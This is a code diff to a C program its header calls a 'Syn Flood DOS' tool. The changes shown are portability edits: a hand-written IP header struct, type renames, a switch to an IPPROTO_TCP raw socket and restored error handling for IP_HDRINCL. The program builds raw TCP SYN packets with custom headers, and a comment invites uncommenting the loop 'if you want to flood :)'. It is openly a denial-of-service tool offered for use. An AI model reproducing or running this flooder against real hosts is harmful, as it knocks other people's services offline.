@@ -2,13 +2,33 @@
 	Syn Flood DOS with LINUX sockets
 */
 #include<stdio.h>
+#include<stdlib.h> //for exit(0);
 #include<string.h> //memset
 #include<sys/socket.h>
-#include<stdlib.h> //for exit(0);
 #include<errno.h> //For errno - the error number
 #include<netinet/tcp.h>	//Provides declarations for tcp header
 #include<netinet/ip.h>	//Provides declarations for ip header
-#include <arpa/inet.h>
+
+struct ip {
+#if BYTE_ORDER == LITTLE_ENDIAN 
+    uint8_t  ip_hl:4,        /* header length */
+        ip_v:4;         /* version */
+#endif
+#if BYTE_ORDER == BIG_ENDIAN 
+    uint8_t  ip_v:4,         /* version */
+        ip_hl:4;        /* header length */
+#endif
+    uint8_t  ip_tos;         /* type of service */
+    uint16_t    ip_len;         /* total length */
+    uint16_t ip_id;          /* identification */
+    uint16_t   ip_off;         /* fragment offset field */
+#define IP_DF 0x4000            /* dont fragment flag */
+#define IP_MF 0x2000            /* more fragments flag */
+    uint8_t  ip_ttl;         /* time to live */
+    uint8_t  ip_p;           /* protocol */
+    uint16_t ip_sum;         /* checksum */
+    struct  in_addr ip_src,ip_dst;  /* source and dest address */
+};
 
 struct pseudo_header    //needed for checksum calculation
 {
@@ -33,7 +53,7 @@ unsigned short csum(unsigned short *ptr,int nbytes) {
 	}
 	if(nbytes==1) {
 		oddbyte=0;
-		*((u_char*)&oddbyte)=*(u_char*)ptr;
+		*((uint8_t*)&oddbyte)=*(uint8_t*)ptr;
 		sum+=oddbyte;
 	}
 
@@ -47,8 +67,7 @@ unsigned short csum(unsigned short *ptr,int nbytes) {
 int main (void)
 {
 	//Create a raw socket
-	// int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
-	int s = socket (PF_INET, SOCK_RAW, IPPROTO_RAW);
+	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
 	//Datagram to represent the packet
 	char datagram[4096] , source_ip[32];
 	//IP header
@@ -112,12 +131,12 @@ int main (void)
 	//IP_HDRINCL to tell the kernel that headers are included in the packet
 	int one = 1;
 	const int *val = &one;
-    setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one));
-	// if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
-	// {
-	// 	printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
-    //     exit(0);
-	// }
+	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
+	{
+		// printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
+		printf ("Error setting IP_HDRINCL.");
+		exit(0);
+	}
 	
 	//Uncommend the loop if you want to flood :)
 	//while (1)
